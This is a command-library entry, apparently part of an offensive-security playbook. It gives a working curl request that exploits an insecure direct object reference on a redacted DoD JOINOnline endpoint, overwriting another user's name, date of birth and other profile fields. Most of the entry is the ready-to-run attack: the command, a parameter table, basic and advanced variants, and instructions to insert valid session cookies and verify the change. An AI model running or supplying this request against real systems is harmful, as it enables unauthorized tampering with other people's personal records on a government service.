---
id: cmd-dod-idor-post
data: >-
  curl -X POST https://www.████████/JOINOnline/Board/SubmitDoc -H "Cookie:
  {YOUR-COOKIES}" -F "UserId=10268" -F "Id=1327" -F "BoardId=1021" -F
  "que2800=Test" -F "que2801=Test" -F "que2802=Test" -F "que2803=Test" -F
  "que2804=12/12/2001" -F "que2805=167" -F "que2806=80" -F "que2807=Male" -F
  "__RequestVerificationToken={VERIFICATION-TOKEN}"
tags:
  - http
  - post
  - multipart
  - idor
  - dod
type: command
output: |-
  HTTP/1.1 200 OK
  Content-Type: text/html

  [Success response or redirect]
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:33.740Z'
verified: false
validated: true
submitted: true
---
# Submit-DoD-IDOR-Profile-Update

## Command

```bash
curl -X POST https://www.████████/JOINOnline/Board/SubmitDoc \
  -H "Cookie: {YOUR-COOKIES}" \
  -F "UserId=10268" \
  -F "Id=1327" \
  -F "BoardId=1021" \
  -F "que2800=Test" \
  -F "que2801=Test" \
  -F "que2802=Test" \
  -F "que2803=Test" \
  -F "que2804=12/12/2001" \
  -F "que2805=167" \
  -F "que2806=80" \
  -F "que2807=Male" \
  -F "__RequestVerificationToken={VERIFICATION-TOKEN}"
```

## Description

This curl command replicates the multipart form-data POST request to the DoD JOINOnline /SubmitDoc endpoint, exploiting IDOR by setting Id to a target user (1327) to update their biographical details. Use after interception and modification; replace cookies and token with valid values from an authenticated session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://www.████████/JOINOnline/Board/SubmitDoc` | Target endpoint for profile submission | Yes |
| `-H "Cookie: {YOUR-COOKIES}"` | Authenticated session cookies | Yes |
| `-F "UserId=10268"` | Board or session user ID | Yes |
| `-F "Id=1327"` | Target user ID (modifiable for IDOR) | Yes |
| `-F "BoardId=1021"` | Specific board identifier | Yes |
| `-F "que2800=Test"` | Name field | Yes |
| `-F "que2804=12/12/2001"` | Date of birth | Yes |
| `-F "que2807=Male"` | Gender | Yes |
| `-F "__RequestVerificationToken={VERIFICATION-TOKEN}"` | Anti-forgery token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.████████/JOINOnline/Board/SubmitDoc -H "Cookie: .AspNetCore.Antiforgery...=value" -F "UserId=10268" -F "Id=1327" -F "BoardId=1021" -F "que2800=Test" -F "que2804=12/12/2001" -F "que2807=Male" -F "__RequestVerificationToken=abc123"
```

### Advanced Usage

Include additional que28XX fields for full demographics:

```bash
curl -X POST https://www.████████/JOINOnline/Board/SubmitDoc -H "Cookie: {YOUR-COOKIES}" -F "UserId=10268" -F "Id=1327" -F "BoardId=1021" -F "que2800=Test" -F "que2801=Test" -F "que2802=Test" -F "que2803=Test" -F "que2804=12/12/2001" -F "que2805=167" -F "que2806=80" -F "que2807=Male" -F "__RequestVerificationToken={VERIFICATION-TOKEN}"
```

## Expected Output

Successful execution returns an HTTP 200 OK response or a redirect to a success page, indicating the target profile was updated. No authorization error occurs due to IDOR. Verify by logging into the target account.

## Related

- [[Related Procedure: Modify-Id-Parameter-for-IDOR-Exploitation]]
